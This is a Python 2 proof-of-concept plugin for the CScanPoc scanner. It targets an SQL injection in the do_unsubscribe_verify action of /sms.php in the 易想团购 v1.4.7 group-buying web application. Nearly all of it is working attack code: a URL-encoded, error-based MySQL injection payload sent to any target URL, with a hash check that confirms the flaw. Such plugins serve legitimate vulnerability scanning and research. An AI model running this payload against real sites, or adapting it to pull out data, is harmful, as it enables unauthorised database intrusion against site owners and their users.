# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'YXTG_0009' # 平台漏洞编号，留空
    name = '易想团购 v1.4.7 /sms.php do_unsubscribe_verify参数 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-08-17'  # 漏洞公布时间
    desc = '''
        易想团购 v1.4.7 /sms.php do_unsubscribe_verify参数 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=060675
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '易想团购'  # 漏洞应用名称
    product_version = '1.4.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4af0f308-2811-42e6-9674-674cecfa51a9'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/sms.php?act=do_unsubscribe_verify&mobile=%61%27%20%61%6E%64%28%73%65%6C%65%63%74%20"
                   "%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61"
                   "%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F"
                   "%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29"
                   "%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61"
                   "%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30"
                   "%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65"
                   "%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23")
            
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if '63e1f04640e83605c1d177544a5a0488' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()